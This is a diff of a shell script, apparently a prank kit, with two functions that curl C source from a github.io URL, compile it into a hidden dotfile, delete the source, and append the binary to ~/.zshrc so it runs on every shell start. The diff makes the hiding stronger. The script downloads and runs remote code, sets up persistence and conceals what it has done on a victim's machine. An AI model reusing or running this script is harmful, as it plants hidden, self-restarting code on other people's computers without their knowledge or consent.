@@ -61,17 +61,17 @@ function fixed_parrot {
 function normal_donut {
 	touch ~/donut
 	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
-	gcc ~/donut.c -o ~/donut
-	echo "echo \"~/donut\" >> ~/.zshrc" > ~/.doit.sh
+	gcc ~/donut.c -o ~/.donut
+	rm ~/donut.c
+	echo "echo \"~/.donut\" >> ~/.zshrc" > ~/.doit.sh
 	bash ~/.doit.sh
 }
 
 function fixed_donut {
 	touch ~/donut
-	chmod 755 ~/donut
 	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
 	gcc ~/donut.c -o ~/.donut
-	#rm ~/donut.c
+	rm ~/donut.c
 	echo "echo \"~/.donut&\" >> ~/.zshrc" > ~/.doit.sh
 	bash ~/.doit.sh
 }
